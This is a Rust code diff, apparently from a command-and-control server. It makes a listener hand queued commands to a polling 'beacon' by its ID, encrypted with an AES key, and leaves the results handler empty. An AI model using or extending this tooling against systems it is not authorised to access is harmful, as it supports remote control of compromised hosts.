@@ -21,11 +21,12 @@
 pub mod metadata;
 pub mod utils;
 
+use crate::webserver::endpoints::*;
 use crate::webserver::{QUEUE, LISTENERS};
 use crate::webserver::endpoints::listeners::utils::ListenerUtils;
 use crate::webserver::endpoints::listeners::metadata::MetaData;
 
-use actix_web::{web, rt, HttpServer, App, Responder, HttpRequest, HttpResponse};
+use actix_web::{web, rt, HttpServer, App, HttpRequest, HttpResponse};
 use rsa::RsaPrivateKey;
 
 use anyhow::{anyhow, Result};
@@ -134,14 +135,35 @@ async fn http_listener_handler(req: HttpRequest, info: web::Path<String>, privat
         match req.method().as_str() {
             // GET method for retrieving commands
             "GET" => {
+                let mut indexes = Vec::new();
+                let mut beacon_commands = Vec::new();
+
                 if let Ok(mut queue) = QUEUE.lock() {
                     debug!("Beacon: {} asking for a command", beacon.id());
-                    
+
+                    // First, find all matching commands and store their indices and commands
+                    for (index, (beacon_id, command)) in queue.commands.iter().enumerate() {
+                        if beacon_id == &beacon.id().to_string() {
+                            debug!("Command: {}", command.clone());
+                            beacon_commands.push(encode_in_json("".to_string(), command.to_string()));
+                            indexes.push(index);
+                        }
+                    }
+
+                    // Removing elements in reverse order to avoid shifting problems
+                    for index in indexes.into_iter().rev() {
+                        queue.commands.remove(index);
+                    }
+
+                    if let Ok(json) = serde_json::to_value(&beacon_commands) {
+                        let payload = format_payload(json, aes_key);
+                        return HttpResponse::Ok().body(payload);
+                    }
                 }
             },
             // POST method for posting results of commands
             "POST" => {
-
+                
             },
             _ => return HttpResponse::NotFound().into(),
         };
